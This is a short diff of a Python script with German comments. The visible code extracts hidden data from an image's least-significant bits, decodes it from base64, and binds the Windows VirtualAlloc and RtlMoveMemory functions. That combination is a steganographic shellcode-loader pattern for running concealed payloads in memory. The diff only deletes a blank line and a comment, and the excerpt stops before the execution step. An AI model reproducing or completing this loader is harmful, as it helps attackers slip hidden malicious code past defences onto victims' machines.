@@ -17,7 +17,6 @@ def extract_bitstring_from_lsb(image_path: str, bit_length: int) -> str:
             bits += str(r & 1)
     return bits
 
-
 def bitstring_to_bytes(bits: str) -> bytes:
     """Wandelt eine Bitfolge in echte Bytes um."""
     return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))
@@ -28,7 +27,6 @@ def decode_base64(data: bytes) -> bytes:
     return base64.b64decode(data)
 
 ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
-# Signatur setzen (nur einmal nötig)
 ctypes.windll.kernel32.RtlMoveMemory.argtypes = [
     ctypes.c_void_p,  # Destination
     ctypes.c_void_p,  # Source
